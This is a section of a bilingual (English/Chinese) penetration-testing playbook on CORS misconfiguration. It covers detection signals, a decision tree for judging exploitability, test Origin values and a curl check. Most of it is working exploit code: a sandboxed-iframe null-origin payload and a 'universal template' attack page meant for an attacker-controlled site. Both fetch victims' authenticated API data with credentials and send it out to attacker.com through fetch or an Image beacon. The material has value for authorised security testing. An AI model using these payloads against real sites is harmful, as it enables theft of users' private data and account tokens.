# §20 CORS Misconfiguration
### 识别信号
- API response contains sensitive data (user info, tokens, private content)
- Response headers include: `Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials`

### 决策流程
```
Response contains sensitive data?
├── YES → Add Origin header: Origin: https://evil.com → resend
│   ├── Response: Access-Control-Allow-Origin: https://evil.com
│   │   + Access-Control-Allow-Credentials: true → CRITICAL CORS ✅
│   ├── Response: Access-Control-Allow-Origin: null
│   │   + Access-Control-Allow-Credentials: true → CRITICAL (exploitable via sandboxed iframe) ✅
│   ├── Response: Access-Control-Allow-Origin: Null (capital N)
│   │   + Access-Control-Allow-Credentials: true → NOT exploitable ❌
│   ├── Response: Access-Control-Allow-Origin: *
│   │   + Access-Control-Allow-Credentials: true → NOT_VULN (W3C标准: credentials为true时origin不能是*,
│   │   浏览器直接拦截,无法跨域读取) ⚠️
│   ├── Response: Access-Control-Allow-Origin: *
│   │   (no credentials header) → NOT_VULN (公开数据,无需鉴权,无危害) ⚠️
│   └── No CORS headers → NOT vulnerable ❌
└── NO → Check for JSONP instead (§21)
```

### Payload
```
Test origins to try:
Origin: https://evil.com
Origin: https://target.com.evil.com  (suffix match bypass)
Origin: https://evil.target.com      (prefix match bypass)
Origin: null
Origin: https://target.com           (same-origin to check reflection)

CORS 3-part test:
1. Does server reflect arbitrary Origin? → Origin: https://evil.com
2. Is Access-Control-Allow-Credentials: true?
3. Can you exploit from a browser? → host HTML on evil.com → fetch with credentials: 'include'
```

### Null Origin Exploit (for null+Credentials:true)
```html
<iframe sandbox="allow-scripts" srcdoc="
  <script>
    fetch('https://target.com/api/data', {credentials: 'include'})
    .then(r => r.text())
    .then(d => fetch('https://attacker.com/?c=' + btoa(d)));
  </script>
"></iframe>
```

### Full CORS Exploit PoC (Credentials + 未授权接口组合 — 通用模板)
```html
<!-- 部署在攻击者控制的网站上 -->
<!-- 当受害者访问此页面时，自动窃取目标系统数据 -->
<html><body><script>
// Step 1: 窃取目标系统的业务数据（替换 {ENDPOINT}/{PARAMS} 为实际值）
fetch('https://{TARGET}/{API_PREFIX}/{ENDPOINT}', {
  method: '{HTTP_METHOD}',
  headers: {'Content-Type': 'application/json'},
  credentials: 'include',
  body: JSON.stringify({ {PARAM_NAME}: '{PARAM_VALUE}' })
}).then(r => r.json()).then(data => {
  // Step 2: 将窃取的数据通过Image beacon外传到攻击者服务器
  // (Image不会触发CORS预检，是静默数据外传的最佳方式)
  new Image().src = 'https://attacker.com/collect?data=' + btoa(JSON.stringify(data));
});

// Step 3: 如果有Credentials且Token可重用，窃取所有需要认证的接口
fetch('https://{TARGET}/{API_PREFIX}/{LIST_ENDPOINT}', {
  method: '{HTTP_METHOD}',
  headers: {'Content-Type': 'application/json'},
  credentials: 'include',
  body: JSON.stringify({pageNum:1, pageSize:100})
}).then(r => r.json()).then(data => {
  // 外传泄露的数据量
  new Image().src = 'https://attacker.com/collect?d=' + btoa(JSON.stringify(data));
});
</script></body></html>
```

**三要素确认（一条curl验证）**：
```bash
curl -sk "https://target.com/api/endpoint" \
  -X POST -H "Content-Type: application/json" \
  -H "Origin: https://evil.com" \
  -d '{}' -D - 2>&1 | grep -i access-control
# 必须同时满足:
#   Access-Control-Allow-Origin: https://evil.com (或 *)
#   Access-Control-Allow-Credentials: true
# 两者同时满足 = 可跨域窃取（严重）
```
